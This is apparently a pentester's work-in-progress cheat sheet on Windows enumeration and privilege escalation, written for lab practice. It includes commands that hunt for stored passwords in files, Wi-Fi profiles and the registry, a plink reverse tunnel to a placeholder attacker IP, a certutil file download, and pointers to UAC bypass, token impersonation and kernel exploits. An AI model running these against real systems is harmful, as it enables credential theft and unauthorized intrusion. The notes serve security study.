# Windows Survey and Privilege Escalation (work in progress)

Windows commands, instrumentation, and powershell cmdlets for enumeration

wmic = Windows Managmenet Instrumentatiom Commandline
*Get* commmands are powershell cmdlets

#### System Information:
```
systeminfo
ver 
hostname

# only OS information 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# verbose hotfix (patch) info 
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn

# disk drives
wmic logicaldisk get caption,description,providername 
```
<br/>

#### Enviornment variables:
```
set

# powershell
Get-ChildItem Env: | ft Key,Value
```

View the current user's information:
```
# username
whoami
echo %username%
$env:UserName

# user details
whoami /all
net user <USERNAME>

# user privilages (looking for SeImperonsatePrivilege/SeAssignPrimaryToken or SeChangeNotifyPrivilege)
whoami /priv

# detailed account information and group memberships:
net user <USERNAME> 
```

Enumerate users and groups: 
```
# who else is logged in 
qwinsta

# local users
net user
net user <USERNAME>
Get-LocalUser

# domain users 
net user /domain 
net user <USERNAME> /domain

#search through user directories
tree /f /a C:\Users\<USERNAME>
Get-ChildItem C:\Users\<USERNAME> -Force

# local groups 
net localgroup
Get-LocalGroups

# users in the group
net localgroup <GROUP>
Get-LocalGroupMember <GROUP>

# domain groups 
net groups
net groups /domain

page 627
```
## Networking:
```
ipconfig
ipconfig /all
route print
arp -a
type C:\windows\system32\drivers\etc\networks
```
Display active TCP/UDP connections:
```
netstat -ano

# connections with executeanle 
netstat -bano
```
Conntections Explained (sushant747)
Local address 0.0.0.0
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.

Local address 127.0.0.1
Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us!

Local address 192.168.1.9
Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us!

Firewall Status:
```

# windows defender
sc query windefend

# firewall
netsh firewall show state
netsh firewall  show config
```


## Password Hunting:

Find the string *password* in certain types of files: 
```
# current directory
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config


# look through payloadallthethings

```
Wifi passwords:
```
netsh wlan show profile
netsh wlan show profile <SSID> key=clear | findstr "Key Content"
```


Registry:

```
# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

Search the HIVES:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


Running proceeses:
```
wmic process list brief
sc queryex type= service 
sc queryex type= service  | finstr "SERVICE NAME"
```

Set up port forwarding for services only available on the local machine:
```
# Port forward using plink
plink.exe -l <ATTACKER_USERNAME> -pw <ATTACKER_PASSOWRD> -R <ATTACKER_PORT>:127.0.0.1:<VICTIM_PORT> <ATTACKER_IP>

#enusre to download the latest version of plink
#The attacker port should provide access to the service from the attacker port on the attacker machine
```

#### WSL
```
where /R C:\Windows bash.exe 
where /R C:\Windows wsl.exe 
```
Determine if the bash.exe is run as root

wsl.exe whoami 

Open a bash terminal using the subsytem
```
bash.exe 

# spawn a tty shell 
python -c 'import pty; pty.spawn("/bin/bash")'
```

Standard linux enumeration

```
pwd 
id 
history
```
#### Token Impersonstion (Payloadallthethings)

Temporary keys that give you access to a system/networj without haveing to provide credentials each time you access a file (think of these as cookies for a computer)
Types of tokens
Delegate - created for logging into a machine using RDP
Impersonate - "non-interactive" such as attaching a network drive or a doman login script

Check for privs if not done already
whoami /priv
Metasploit Token Impersonation


<br /> 

Scripts: 
* winPEAS.bat
* windows-exploit-suggester.py
* WinEnum.ps1

Tools

## Bloodhound
```
#install
sudo apt install bloodhound 

#start bloodhound
bloodhound

#start neo4
neo4j console

#run sharphound on the target windows machine
./Sharphound.exe

#copy the zip file to your attacking machine, drag and drop into neo4j
```
Reference Sauna HTB machine


### Automated Enumeration Tools
- [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- Windows Priv Esc Checklist: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
- Sherlock: https://github.com/rasta-mouse/Sherlock
- Watson: https://github.com/rasta-mouse/Watson
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- JAWS: https://github.com/411Hall/JAWS
- Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Metasploit Local Exploit Suggester: https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
```
msf > run post/multi/recon/local_exploit_suggester
```
- Seatbelt: https://github.com/GhostPack/Seatbelt
- SharpUp: https://github.com/GhostPack/SharpUp


### Techniques 

UAC Bypass - https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
Juicy Potato 
* must tell which CLSID to run or let it choose for you which may work 
** well known list for each OS - https://github.com/ohpe/juicy-potato/tree/master/CLSID

icacls - what files do we have read/write/execute abilites?


### Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits

### Transferring Files

Getting files onto the target machine:
```
# grab file from a webserver
certutil -urlcache -f http://<IP_ADDR>/<FILE> <OUTPUT_FILE>


### Referenced Checklists
1. https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
2. Udemy Windows Privilege Escalation for Beginners Course


